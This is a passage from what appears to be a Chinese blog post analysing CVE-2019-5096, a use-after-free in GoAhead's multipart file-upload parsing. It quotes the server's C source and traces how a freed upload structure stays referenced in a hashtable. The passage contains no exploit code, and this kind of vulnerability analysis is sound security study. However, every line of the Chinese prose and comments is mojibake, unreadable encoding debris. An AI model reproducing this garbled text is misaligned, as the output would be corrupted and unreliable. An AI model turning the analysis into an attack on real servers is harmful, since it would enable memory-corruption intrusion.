class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¯ä»¥åœ¨ VSCode ä¸­æœç´¢ multipart&#x2F;form-data å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(key, <span class="string">&quot;content-type&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            wfree(wp-&gt;contentType);</span><br><span class="line">            wp-&gt;contentType = sclone(value);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)) &#123;</span><br><span class="line">                wp-&gt;flags |= WEBS_FORM;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;application/json&quot;</span>)) &#123;</span><br><span class="line">                wp-&gt;flags |= WEBS_JSON;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(value, <span class="string">&quot;multipart/form-data&quot;</span>)) &#123;</span><br><span class="line">                wp-&gt;flags |= WEBS_UPLOAD;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœ content-type å­—æ®µçš„å†…å®¹æ˜¯ multipart&#x2F;form-dataï¼Œåˆ™ flags ä¼šè¢«ç½®ä¸º WEBS_UPLOADã€‚</p>
<p>å’Œä¸Šé¢çš„ä»£ç ç›¸å‘¼åº”ï¼Œå¦‚æœåœ¨ flags ä¸­åˆ¤æ–­åˆ°äº† WEBS_UPLOAD è¡¨ç¤ºè¯·æ±‚çš„ç±»å‹æ˜¯ multipart&#x2F;form-dataã€‚é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åˆ†æ websProcessUploadData å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">PUBLIC <span class="type">bool</span> <span class="title function_">websProcessUploadData</span><span class="params">(Webs *wp)</span>    <span class="comment">// å¯èƒ½çš„æ¼æ´å…¥å£</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *line, *nextTok;</span><br><span class="line">    ssize   nbytes;</span><br><span class="line">    <span class="type">bool</span>    canProceed;</span><br><span class="line"></span><br><span class="line">    line = <span class="number">0</span>;</span><br><span class="line">    canProceed = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (canProceed &amp;&amp; !wp-&gt;finalized &amp;&amp; wp-&gt;uploadState != UPLOAD_CONTENT_END) &#123;</span><br><span class="line">        <span class="keyword">if</span>  (wp-&gt;uploadState == UPLOAD_BOUNDARY || wp-&gt;uploadState == UPLOAD_CONTENT_HEADER) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Parse the next input line</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            line = wp-&gt;input.servp;</span><br><span class="line">            <span class="keyword">if</span> ((nextTok = <span class="built_in">memchr</span>(line, <span class="string">&#x27;\n&#x27;</span>, bufLen(&amp;wp-&gt;input))) == <span class="number">0</span>) &#123;   <span class="comment">// æ‰¾åˆ°åˆ†å‰²è¾¹ç•Œè¿™ä¸€è¡Œçš„ç»“å°¾æ¢è¡Œç¬¦</span></span><br><span class="line">                <span class="comment">/* Incomplete line */</span></span><br><span class="line">                canProceed = <span class="number">0</span>;    <span class="comment">// æ‰¾ä¸åˆ°çš„è¯è¯´æ˜è¿™ä¸ªè¯·æ±‚ä¸å¯¹åŠ²</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *nextTok++ = <span class="string">&#x27;\0&#x27;</span>;    <span class="comment">// æ¢è¡Œç¬¦å˜æˆ \x00</span></span><br><span class="line">            nbytes = nextTok - line;    <span class="comment">// è®¡ç®—åˆ†å‰²è¡Œçš„é•¿åº¦</span></span><br><span class="line">            assert(nbytes &gt; <span class="number">0</span>);    <span class="comment">// å¿…é¡»å¤§äº 0</span></span><br><span class="line">            websConsumeInput(wp, nbytes);</span><br><span class="line">            strim(line, <span class="string">&quot;\r&quot;</span>, WEBS_TRIM_END);    <span class="comment">// ä»å­—ç¬¦ä¸²ä¸­å»æ‰æŸä¸ªå­—ç¬¦ï¼Ÿ</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (wp-&gt;uploadState) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            initUpload(wp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_BOUNDARY:</span><br><span class="line">            processContentBoundary(wp, line);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_CONTENT_HEADER:    <span class="comment">// åˆ†å‰²è¡Œçš„ä¸‹ä¸€è¡Œï¼ˆæ•°æ®å†…å®¹å¤´éƒ¨ï¼‰</span></span><br><span class="line">            processUploadHeader(wp, line);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_CONTENT_DATA:</span><br><span class="line">            canProceed = processContentData(wp);</span><br><span class="line">            <span class="keyword">if</span> (bufLen(&amp;wp-&gt;input) &lt; wp-&gt;boundaryLen) &#123;</span><br><span class="line">                <span class="comment">/*  Incomplete boundary - return to get more data */</span></span><br><span class="line">                canProceed = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> UPLOAD_CONTENT_END:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bufCompact(&amp;wp-&gt;input);</span><br><span class="line">    <span class="keyword">return</span> canProceed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä½äº upload.c ä¸­ï¼Œç¬¬ 106 è¡Œã€‚é€šè¯»ä¸‹æ¥ï¼Œå‡½æ•°ä¸»è¦çš„åŠŸèƒ½æ˜¯å®šä½ banner ä»¥åŠ(å¦‚ä¸Šæ‰€è¿°)å¤„ç† data ç­‰ã€‚</p>
<p>å…¶å¤„ç†æµç¨‹å’Œæˆ‘ä»¬ä¹‹å‰æåˆ°çš„ç±»ä¼¼ï¼Œå…ˆæ‰¾åˆ°åˆ†å‰²è¡Œç„¶åæ ¹æ®åŒ¹é…åˆ°çš„ä¸åŒ token è°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°ï¼Œç›¸å…³çš„æ³¨é‡Šåœ¨ä»£ç ä¸­å·²ç»ç»™å‡ºã€‚</p>
<p>å…ˆæ¥çœ‹å¤„ç†åˆ†å—æ•°æ®å¤´éƒ¨çš„éƒ¨åˆ†</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">processUploadHeader</span><span class="params">(Webs *wp, <span class="type">char</span> *line)</span>    <span class="comment">// å¤„ç†åˆ†å—æ•°æ®å¤´éƒ¨</span></span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    <span class="type">char</span>        *key, *headerTok, *rest, *nextPair, *value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        wp-&gt;uploadState = UPLOAD_CONTENT_DATA;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    trace(<span class="number">7</span>, <span class="string">&quot;Header line: %s&quot;</span>, line);</span><br><span class="line"></span><br><span class="line">    headerTok = line;</span><br><span class="line">    stok(line, <span class="string">&quot;: &quot;</span>, &amp;rest);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scaselesscmp(headerTok, <span class="string">&quot;Content-Disposition&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            The content disposition header describes either a form variable or an uploaded file.</span></span><br><span class="line"><span class="comment">            å¤´éƒ¨çš„ Content-Disposition å­—æ®µè¡¨æ˜äº†è¿™å—æ•°æ®åˆ°åº•æ˜¯è¡¨å•å˜é‡ï¼Œè¿˜æ˜¯ä¸Šä¼ çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            Content-Disposition: form-data; name=&quot;field1&quot;</span></span><br><span class="line"><span class="comment">            &gt;&gt;blank line</span></span><br><span class="line"><span class="comment">            Field Data</span></span><br><span class="line"><span class="comment">            ---boundary</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            Content-Disposition: form-data; name=&quot;field1&quot; filename=&quot;user.file&quot;</span></span><br><span class="line"><span class="comment">            &gt;&gt;blank line</span></span><br><span class="line"><span class="comment">            File data</span></span><br><span class="line"><span class="comment">            ---boundary</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        key = rest;</span><br><span class="line">        wfree(wp-&gt;uploadVar);</span><br><span class="line">        wfree(wp-&gt;clientFilename);</span><br><span class="line">        wp-&gt;uploadVar = wp-&gt;clientFilename = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (key &amp;&amp; stok(key, <span class="string">&quot;;\r\n&quot;</span>, &amp;nextPair)) &#123;</span><br><span class="line"></span><br><span class="line">            key = strim(key, <span class="string">&quot; &quot;</span>, WEBS_TRIM_BOTH);</span><br><span class="line">            ssplit(key, <span class="string">&quot;= &quot;</span>, &amp;value);</span><br><span class="line">            value = strim(value, <span class="string">&quot;\&quot;&quot;</span>, WEBS_TRIM_BOTH);   <span class="comment">// å»æ‰å¤šä½™çš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (scaselesscmp(key, <span class="string">&quot;form-data&quot;</span>) == <span class="number">0</span>) &#123;   <span class="comment">// åŒ¹é…åˆ° form-data é€šç”¨å­—æ®µ</span></span><br><span class="line">                <span class="comment">/* Nothing to do */</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scaselesscmp(key, <span class="string">&quot;name&quot;</span>) == <span class="number">0</span>) &#123;    <span class="comment">// åŒ¹é…åˆ° name å­—æ®µï¼Œè¡¨å•å’Œ file éƒ½æœ‰</span></span><br><span class="line">                wfree(wp-&gt;uploadVar);</span><br><span class="line">                wp-&gt;uploadVar = sclone(value);   <span class="comment">// æŠŠ name çš„å†…å®¹äº¤ç»™ wp ç»“æ„ä½“</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scaselesscmp(key, <span class="string">&quot;filename&quot;</span>) == <span class="number">0</span>) &#123;    <span class="comment">// åŒ¹é…åˆ° file æƒ…å†µ</span></span><br><span class="line">                <span class="keyword">if</span> (wp-&gt;uploadVar == <span class="number">0</span>) &#123;</span><br><span class="line">                    websError(wp, HTTP_CODE_BAD_REQUEST, <span class="string">&quot;Bad upload state. Missing name field&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                value = websNormalizeUriPath(value);  <span class="comment">// Normalize a URI path to remove &quot;./&quot;,  &quot;../&quot; and redundant separators.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (*value == <span class="string">&#x27;.&#x27;</span> || !websValidUriChars(value) || <span class="built_in">strpbrk</span>(value, <span class="string">&quot;\\/:*?&lt;&gt;|~\&quot;&#x27;%`^\n\r\t\f&quot;</span>)) &#123;</span><br><span class="line">                    websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, <span class="string">&quot;Bad upload client filename&quot;</span>);  <span class="comment">// è¿‡æ»¤ä¸åˆæ³•çš„æ–‡ä»¶å</span></span><br><span class="line">                    wfree(value);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                wfree(wp-&gt;clientFilename);   </span><br><span class="line">                wp-&gt;clientFilename = value;    <span class="comment">// æ–‡ä»¶åç»™ wp</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Create the file to hold the uploaded data</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                wfree(wp-&gt;uploadTmp);</span><br><span class="line">                <span class="keyword">if</span> ((wp-&gt;uploadTmp = websTempFile(uploadDir, <span class="string">&quot;tmp&quot;</span>)) == <span class="number">0</span>) &#123;    <span class="comment">// åˆ›å»ºä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">                    websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR,</span><br><span class="line">                        <span class="string">&quot;Cannot create upload temp file %s. Check upload temp dir %s&quot;</span>, wp-&gt;uploadTmp, uploadDir);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                trace(<span class="number">5</span>, <span class="string">&quot;File upload of: %s stored as %s&quot;</span>, wp-&gt;clientFilename, wp-&gt;uploadTmp);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((wp-&gt;upfd = open(wp-&gt;uploadTmp, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, <span class="number">0600</span>)) &lt; <span class="number">0</span>) &#123;    <span class="comment">// æ‰“å¼€ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">                    websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, <span class="string">&quot;Cannot open upload temp file %s&quot;</span>, wp-&gt;uploadTmp);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Create the files[id]</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                freeUploadFile(wp-&gt;currentFile);    <span class="comment">// å…³é”®ç‚¹1</span></span><br><span class="line">                file = wp-&gt;currentFile = walloc(<span class="keyword">sizeof</span>(WebsUpload));</span><br><span class="line">                <span class="built_in">memset</span>(file, <span class="number">0</span>, <span class="keyword">sizeof</span>(WebsUpload));</span><br><span class="line">                file-&gt;clientFilename = sclone(wp-&gt;clientFilename);   <span class="comment">// æ¯ä¸€é¡¹éƒ½å¯¹åº”ç€ä¸€ä¸ª chunk</span></span><br><span class="line">                file-&gt;filename = sclone(wp-&gt;uploadTmp);</span><br><span class="line">            &#125;</span><br><span class="line">            key = nextPair;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scaselesscmp(headerTok, <span class="string">&quot;Content-Type&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">            trace(<span class="number">5</span>, <span class="string">&quot;Set files[%s][CONTENT_TYPE] = %s&quot;</span>, wp-&gt;uploadVar, rest);</span><br><span class="line">            wp-&gt;currentFile-&gt;contentType = sclone(rest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°å¤§è‡´çš„åŠŸèƒ½æ˜¯åŒ¹é…ä¸åŒå­—æ®µçš„å€¼ï¼Œæˆ‘è¿™é‡Œç®€å•åˆ†ä¸ºä¸‰ç§æƒ…å†µã€‚</p>
<p>å…¶ä¸€ï¼šåŒ¹é… Content-Disposition å­—æ®µï¼Œå®ƒçš„å€¼é»˜è®¤ä¸º form-data</p>
<p>å…¶äºŒï¼šåŒ¹é… name å­—æ®µï¼Œå®ƒçš„å€¼ä¸º HTML è¡¨å•ä¸­å˜é‡çš„åå­—ï¼Œæ­¤å­—æ®µæ— è®ºæ˜¯ä¸Šä¼  file æˆ–æ˜¯æäº¤æ™®é€šè¡¨å•éƒ½ä¼šå­˜åœ¨ã€‚</p>
<p>å…¶ä¸‰ï¼šåŒ¹é… filenameï¼Œè¿™ä¸ªå­—æ®µä»…ä»…å½“ä¸Šä¼  file çš„æ—¶å€™åŒ…å«ï¼Œå®ƒæ˜¯å®¢æˆ·ç«¯ä¸Šä¼ çš„æ–‡ä»¶çš„åå­—ã€‚</p>
<p>å…³é”®ä»£ç å°±æ˜¯åŒ¹é…åˆ° file çš„æƒ…å†µï¼Œæ­¤æ—¶å‡½æ•°ä¼šè¿‡æ»¤æ–‡ä»¶åï¼Œç¡®ä¿ä¸åŒ…å«éæ³•çš„å­—ç¬¦ï¼Œä¹‹ååœ¨ä¸´æ—¶ç›®å½•åˆ›å»ºæ–‡ä»¶(åˆ©ç”¨ websTempFile å‡½æ•°å®ç°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹ä¿®æ”¹çš„å‡½æ•°)ï¼Œå°è¯•æ‰“å¼€è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå¹¶å°† FILE æŒ‡é’ˆä¼ é€’ç»™ wp-&gt;upfd å­—æ®µã€‚</p>
<p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ç¬¬ 257 è¡Œï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªå…³é”®ç‚¹ã€‚æ­¤å¤„å°† wp-&gt;currentFile æŒ‡å‘çš„ç»“æ„ freeï¼ŒfreeUploadFile å‡½æ•°å°±æ˜¯åœ¨æŠ«éœ²ä¿¡æ¯ä¸­ç»™å‡ºçš„å­˜åœ¨é—®é¢˜çš„å‡½æ•°ã€‚å®é™…ä¸Šè¿™ä¸ªå‡½æ•°æœ¬èº«æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œåªä¸è¿‡å®ƒçš„è°ƒç”¨è€…æ²¡æœ‰åšå¥½ç›¸å…³çš„ä¿æŠ¤ã€‚</p>
<p>currentFile ä¿å­˜çš„æ˜¯æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ä¸´æ—¶æ–‡ä»¶ç»“æ„ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œ processUploadHeader å‡½æ•°çš„æ—¶å€™è¿™ä¸ªå­—æ®µä¸ºç©ºï¼Œé€šè¿‡ walloc(sizeof(WebsUpload)) åˆ†é…æ–°çš„ç©ºé—´ç”¨äºä¿å­˜ä¸´æ—¶æ–‡ä»¶çš„åå­—å’Œå®¢æˆ·ç«¯ä¼ é€’è¿‡æ¥çš„çœŸå®çš„æ–‡ä»¶åã€‚</p>
<p>ç´§æ¥ç€æ¥åˆ°å¤„ç† data æœ¬èº«çš„ä½ç½®ï¼Œç¬¬ 145 è¡Œè°ƒç”¨äº†å‡½æ•° processContentDataï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">processContentData</span><span class="params">(Webs *wp)</span></span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    WebsBuf     *content;</span><br><span class="line">    ssize       size, nbytes, len;</span><br><span class="line">    <span class="type">char</span>        *data, *bp;</span><br><span class="line"></span><br><span class="line">    content = &amp;wp-&gt;input;</span><br><span class="line">    file = wp-&gt;currentFile;   <span class="comment">// ä¹‹å‰å¤„ç†è¿‡çš„ WebsUpload ç»“æ„ä½“</span></span><br><span class="line"></span><br><span class="line">    size = bufLen(content);</span><br><span class="line">    <span class="keyword">if</span> (size &lt; wp-&gt;boundaryLen) &#123;</span><br><span class="line">        <span class="comment">/*  Incomplete boundary. Return and get more data */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((bp = getBoundary(wp, content-&gt;servp, size)) == <span class="number">0</span>) &#123;   <span class="comment">// å¯»æ‰¾åˆ†å‰²è¡Œ</span></span><br><span class="line">        trace(<span class="number">7</span>, <span class="string">&quot;uploadFilter: Got boundary filename %x&quot;</span>, wp-&gt;clientFilename);</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                No signature found yet. probably more data to come. Must handle split boundaries.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            data = content-&gt;servp;</span><br><span class="line">            nbytes = ((<span class="type">int</span>) (content-&gt;endp - data)) - (wp-&gt;boundaryLen - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (writeToFile(wp, content-&gt;servp, nbytes) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* Proceed to handle error */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            websConsumeInput(wp, nbytes);</span><br><span class="line">            <span class="comment">/* Get more data */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    data = content-&gt;servp;</span><br><span class="line">    nbytes = (bp) ? (bp - data) : bufLen(content);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nbytes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            This is the CRLF before the boundary</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        len = nbytes;</span><br><span class="line">        <span class="keyword">if</span> (len &gt;= <span class="number">2</span> &amp;&amp; data[len - <span class="number">2</span>] == <span class="string">&#x27;\r&#x27;</span> &amp;&amp; data[len - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            len -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Write the last bit of file data and add to the list of files and define environment variables</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (writeToFile(wp, data, len) &lt; <span class="number">0</span>) &#123;   <span class="comment">// å†™å…¥æ–‡ä»¶é”™è¯¯</span></span><br><span class="line">                <span class="comment">/* Proceed to handle error */</span></span><br><span class="line">                websConsumeInput(wp, nbytes);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            hashEnter(wp-&gt;files, wp-&gt;uploadVar, valueSymbol(file), <span class="number">0</span>);  <span class="comment">// å…³é”®ç‚¹2</span></span><br><span class="line">            defineUploadVars(wp);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (wp-&gt;uploadVar) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Normal string form data variables</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            data[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            trace(<span class="number">5</span>, <span class="string">&quot;uploadFilter: form[%s] = %s&quot;</span>, wp-&gt;uploadVar, data);</span><br><span class="line">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, <span class="number">-1</span>);</span><br><span class="line">            websDecodeUrl(data, data, <span class="number">-1</span>);</span><br><span class="line">            websSetVar(wp, wp-&gt;uploadVar, data);</span><br><span class="line">        &#125;</span><br><span class="line">        websConsumeInput(wp, nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp-&gt;clientFilename) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Now have all the data (we&#x27;ve seen the boundary)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        close(wp-&gt;upfd);</span><br><span class="line">        wp-&gt;upfd = <span class="number">-1</span>;</span><br><span class="line">        wfree(wp-&gt;clientFilename);</span><br><span class="line">        wp-&gt;clientFilename = <span class="number">0</span>;</span><br><span class="line">        wfree(wp-&gt;uploadTmp);</span><br><span class="line">        wp-&gt;uploadTmp = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wp-&gt;uploadState = UPLOAD_BOUNDARY;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä¸»è¦å®ç°çš„åŠŸèƒ½æ˜¯æ‰¾åˆ° currentFile å­—æ®µ(ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°ç”Ÿæˆçš„ç»“æ„)ï¼Œç„¶åç»§ç»­æœç´¢è¯·æ±‚ä½“ç›´åˆ°æ‰¾åˆ°ä¸‹ä¸€ä¸ª banner ä¸ºæ­¢ï¼Œå°†æ‰¾åˆ°çš„æ•°æ®é€šè¿‡ writeToFile å‡½æ•°å†™å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚</p>
<p>ä¹‹åæ¥åˆ°å…³é”®ç‚¹ 2ã€‚è¿™é‡Œä¼šå°†ä¹‹å‰å–å‡ºçš„ currentFile é€šè¿‡ hashEnter å‡½æ•°åŠ å…¥ä¸€ä¸ª hashtableï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªé“¾è¡¨æˆ–è€…æ•°ç»„ã€‚</p>
<p>ç¨‹åºä¼šæŒ‰ç…§ä¸Šè¿°æµç¨‹é€æ­¥å¤„ç†æ¯ä¸ªæ•°æ®å—ã€‚è¿™é‡Œæˆ‘ç®€å•ç”»ä¸€å¼ å›¾æ¥è¡¨ç¤ºè¿™ç§å¤„ç†æµç¨‹ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-5096-2.png"
                     
                ></p>
<p>å‘ç°ä»€ä¹ˆé—®é¢˜äº†å˜›ï¼Ÿå½“æ•°æ®åŒ…ä¸­åªæœ‰ä¸€ä¸ª data å—çš„æ—¶å€™ï¼Œè¿™æ ·å¤„ç†æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å½“å­˜åœ¨ä¸¤ä¸ªæˆ–è€…æ›´å¤šæ•°æ®åŒ…çš„æ—¶å€™ï¼Œç¬¬ä¸€æ¬¡â€œå¾ªç¯â€å°† currentFile æŒ‡å‘çš„å†…å­˜åŠ å…¥ hashtableï¼Œå½“å†æ¬¡è¿”å› processUploadHeader å‡½æ•°æ—¶ï¼Œä¼šå¯¹ä¸Šä¸€æ¬¡å¤„ç†çš„é‚£ä¸ª currentFile è°ƒç”¨ freeUploadFile ï¼Œæ­¤æ—¶å­˜åœ¨äº hashtable ä¸­çš„å†…å­˜å·²ç»å¤„äº free çŠ¶æ€ï¼Œä¸ºä¹‹åçš„è§¦å‘åŸ‹ä¸‹ä¼ç¬”ã€‚</p>
<p>è¿˜è®°å¾—ä¹‹å‰è¯´çš„ 5 ä¸ªçŠ¶æ€ï¼Ÿå½“ä¸€ä¸ªè¯·æ±‚ç»“æŸçš„æ—¶å€™ä¼šè°ƒç”¨ complete æ¸…ç†ç¯å¢ƒï¼Œæºä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">complete</span><span class="params">(Webs *wp, <span class="type">int</span> reuse)</span>    <span class="comment">// è¯·æ±‚å¤„ç†ç»“æŸ</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(wp);</span><br><span class="line">    assert(websValid(wp));</span><br><span class="line">    assert(wp-&gt;state == WEBS_BEGIN || wp-&gt;state == WEBS_COMPLETE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (reuse &amp;&amp; wp-&gt;flags &amp; WEBS_KEEP_ALIVE &amp;&amp; wp-&gt;rxRemaining == <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœå­˜åœ¨ keep alive æƒ…å†µ</span></span><br><span class="line">        reuseConn(wp);    <span class="comment">// é‡ç”¨é“¾æ¥ï¼Ÿ</span></span><br><span class="line">        socketCreateHandler(wp-&gt;sid, SOCKET_READABLE, socketEvent, wp);</span><br><span class="line">        trace(<span class="number">5</span>, <span class="string">&quot;Keep connection alive&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    trace(<span class="number">5</span>, <span class="string">&quot;Close connection&quot;</span>);</span><br><span class="line">    wp-&gt;state = WEBS_BEGIN;</span><br><span class="line">    wp-&gt;flags |= WEBS_CLOSED;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å½“è¯·æ±‚å¤´åŒ…å« Connection: keep-alive å­—æ ·çš„æ—¶å€™ï¼Œç¨‹åºå°è¯•é‡ç”¨é“¾æ¥è°ƒç”¨ reuseConn å‡½æ•°ã€‚</p>
